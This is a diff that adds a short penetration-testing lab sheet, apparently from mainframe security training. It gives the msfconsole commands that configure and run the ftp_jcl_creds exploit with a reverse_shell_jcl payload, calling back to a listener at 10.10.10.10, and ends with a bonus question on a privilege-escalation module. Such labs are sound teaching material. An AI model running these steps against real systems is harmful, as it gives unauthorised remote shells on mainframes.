@@ -1,0 +1,21 @@
+Lab 08: Using Metasploit to Connect/Execute
+
+Launch msfconsole, then use the use ftp_jcl_creds exploit with the reverse_shell_jcl payload
+
+$ msfconsole
+msf > use exploit/mainframe/ftp/ftp_jcl_creds
+msf exploit(ftp_jcl_creds) > set payload cmd/mainframe/reverse_shell_jcl
+msf exploit(ftp_jcl_creds) > show options
+msf exploit(ftp_jcl_creds) > set FTPPASS <password>
+FTPPASS => <password>
+msf exploit(ftp_jcl_creds) > set FTPUSER <user>
+FTPUSER => <user>
+msf exploit(ftp_jcl_creds) > set rhost <host>m
+rhost => <host>
+msf exploit(ftp_jcl_creds) > set rport <port>
+rport => <port>
+msf exploit(ftp_jcl_creds) > set lhost 10.10.10.10
+lhost => 10.10.10.10
+msf exploit(ftp_jcl_creds) > exploit
+
+Bonus: What does the apf_privesc_jcl do and how can you use it?
